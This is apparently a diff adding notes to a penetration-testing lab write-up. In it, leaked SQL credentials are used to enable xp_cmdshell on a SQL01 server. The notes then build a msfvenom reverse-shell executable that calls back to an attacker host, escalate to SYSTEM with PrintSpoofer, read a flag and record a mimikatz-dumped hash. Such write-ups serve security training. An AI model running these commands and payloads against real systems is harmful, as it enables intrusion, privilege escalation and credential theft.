@@ -369,3 +369,205 @@ Found creds in [web.config](./172.16.7.3-Department%20Shares_IT_Private_Developm
            <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
        </connectionStrings>
 ```
+
+## Enumerating SQL01 with netdb creds
+
+```bash
+└─$ impacket-mssqlclient netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (netdb  dbo@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
+    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
+    show_query                 - show query
+    mask_query                 - mask query
+
+SQL (netdb  dbo@master)> enable_xp_cmdshell
+INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (netdb  dbo@master)> xp_cmdshell 'dir C:\Users\ /b';
+ERROR(SQL01\SQLEXPRESS): Line 1: Incorrect syntax near 'dir'.
+SQL (netdb  dbo@master)> xp_cmdshell "dir C:\Users\ /b";
+output
+---------------------------
+Administrator
+administrator.INLANEFREIGHT
+lab_adm
+mssqlsvc
+Public
+NULL
+SQL (netdb  dbo@master)> xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt";
+output
+-----------------
+Access is denied.
+NULL
+SQL (netdb  dbo@master)>
+```
+
+Checked out priv of netdb on `SQL01`
+
+```
+Here's priv of net_db
+
+```
+SQL (netdb  dbo@master)> xp_cmdshell "whoami /all"
+output
+--------------------------------------------------------------------------------
+NULL
+USER INFORMATION
+----------------
+NULL
+User Name                   SID
+=========================== ===============================================================
+nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
+NULL
+NULL
+GROUP INFORMATION
+-----------------
+NULL
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group
+NULL
+NULL
+PRIVILEGES INFORMATION
+----------------------
+NULL
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+NULL
+NULL
+USER CLAIMS INFORMATION
+-----------------------
+NULL
+User claims unknown.
+NULL
+Kerberos support for Dynamic Access Control on this device has been disabled.
+NULL
+```
+
+```
+SQL (netdb  dbo@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee    grantor
+----------   --------   ---------------   ----------   --------   ----------------------------
+b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser
+SQL (netdb  dbo@master)>
+```
+
+```
+SQL (netdb  dbo@master)> enum_logins
+name                                 type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
+----------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
+sa                                   SQL_LOGIN                 1          1               0             0            0              0           0           0           0
+##MS_PolicyEventProcessingLogin##    SQL_LOGIN                 1          0               0             0            0              0           0           0           0
+##MS_PolicyTsqlExecutionLogin##      SQL_LOGIN                 1          0               0             0            0              0           0           0           0
+NT SERVICE\SQLWriter                 WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
+NT SERVICE\Winmgmt                   WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
+NT Service\MSSQL$SQLEXPRESS          WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
+SQL01\Administrator                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
+BUILTIN\Users                        WINDOWS_GROUP             0          0               0             0            0              0           0           0           0
+NT AUTHORITY\SYSTEM                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
+NT SERVICE\SQLTELEMETRY$SQLEXPRESS   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
+netdb                                SQL_LOGIN                 0          1               0             0            0              0           0           0           0
+```
+
+Got privesc via [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) from the SQL access. I then created payload for revshell via msfenom.
+
+```
+└─$ impacket-mssqlclient netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (netdb  dbo@master)> upload /tmp/rev.exe C:\Windows\Temp\rev.exe
+[+] Data length (b64-encoded): 10.00 KB with MD5: 038479582f75ed71e160d36ee22c965d
+[+] Uploading...
+[+] Uploaded
+[+] certutil -decode "C:\Windows\Temp\rev.exe.b64" "C:\Windows\Temp\rev.exe"
+[+] del "C:\Windows\Temp\rev.exe.b64"
+[+] certutil -hashfile "C:\Windows\Temp\rev.exe" MD5
+[+] MD5 hashes match
+SQL (netdb  dbo@master)> xp_cmdshell "C:\Windows\Temp\PrintSpoofer64.exe -i -c C:\Windows\Temp\rev.exe"
+SQL (-@master)>
+```
+
+```
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.7.240 LPORT=4444 -f exe -o /tmp/rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: rev.exe
+```
+
+Got revshell as NT authority and flag.txt
+
+```
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of c:\Users\Administrator\Desktop
+
+04/11/2022  10:32 PM    <DIR>          .
+04/11/2022  10:32 PM    <DIR>          ..
+04/11/2022  10:33 PM                21 flag.txt
+               1 File(s)             21 bytes
+               2 Dir(s)  17,245,675,520 bytes free
+
+c:\Users\Administrator\Desktop>type flag.txt
+type flag.txt
+s3imp3rs0nate_cl@ssic
+```
+
+Uploaded mimikatz and got Administrator hash: `bdaffbfe64f1fc646a3353be1c2c3c99`
+
